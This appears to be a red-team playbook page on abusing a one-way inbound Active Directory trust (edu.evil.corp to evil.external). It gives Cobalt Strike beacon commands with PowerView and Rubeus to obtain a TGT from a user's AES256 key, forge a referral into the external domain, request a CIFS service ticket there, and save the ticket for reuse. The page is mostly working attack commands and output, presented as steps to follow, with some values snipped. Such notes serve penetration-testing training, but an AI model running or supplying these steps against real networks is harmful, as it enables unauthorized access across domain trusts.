# One-Way (Inbound)

edu.evil.corp has a one-way inbound trust with evil.external.
```beacon
beacon> powershell Get-DomainTrust

SourceName      : edu.evil.corp
TargetName      : evil.external
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes : 
TrustDirection  : Inbound
WhenCreated     : 3/10/2022 10:13:25 PM
WhenChanged     : 3/10/2022 10:13:25 PM
```

Inbound means, that principals in our domain can be granted access to resources in the external domain.

## Jump the forest
⚠ In order to access the domain you need to impersonate a user from this domain

### Create inter-realm key
1. Create TGT for the principal in question
      ```beacon
      beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgt /user:jonas /domain:edu.evil.corp /aes256:891[..snip..]7c41 /opsec /nowrap

      [*] Action: Ask TGT
      [*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
      [*] Using aes256-cts-hmac_sha1 hash: 891[..snip..]7c41
      [*] Building AS-REQ (w/ preauth) for: 'edu.evil.corp\jonas'
      [+] TGT request successful!
      [*] base64(ticket.kirbi):

            doIFdD [...snip...] MuSU8=
      ```

2. Create a referal ticket
      ```beacon
      beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:krbtgt/evil.external /domain:edu.evil.corp /dc:dc-2.edu.evil.corp /ticket:doIFdD[...snip...]MuSU8= /nowrap

      [*] Action: Ask TGS
      [*] Using domain controller: dc-2.edu.evil.corp (10.10.17.71)
      [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
      [*] Building TGS-REQ request for: 'krbtgt/evil.external'
      [+] TGS request successful!
      [*] base64(ticket.kirbi):

            doIFMT [...snip...] 5BTA==
      ```

3. Request TGS in target domain with inter-realm TGT
      ```beacon
      beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe asktgs /service:cifs/ad.evil.external /domain:ad.evil.external /dc:ad.evil.external /ticket:doIFMT[...snip...]5BTA== /nowrap

      [*] Action: Ask TGS
      [*] Using domain controller: ad.evil.external (10.10.14.55)
      [*] Requesting default etypes (RC4_HMAC, AES[128/256]_CTS_HMAC_SHA1) for the service ticket
      [*] Building TGS-REQ request for: 'cifs/ad.evil.external'
      [+] TGS request successful!
      [+] Ticket successfully imported!
      [*] base64(ticket.kirbi):

            doIFsD [...snip...] JuYWw=
      ```

4. Store to a file
      > [System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\external.kirbi", [System.Convert]::FromBase64String("doIFiD [...snip...] 5hbA=="))

5. [[Use Kerberos ticket (kirbi)]]

## Tools
########
########

```meta
ttp: T1000
requirements:
results: 
description: 
```
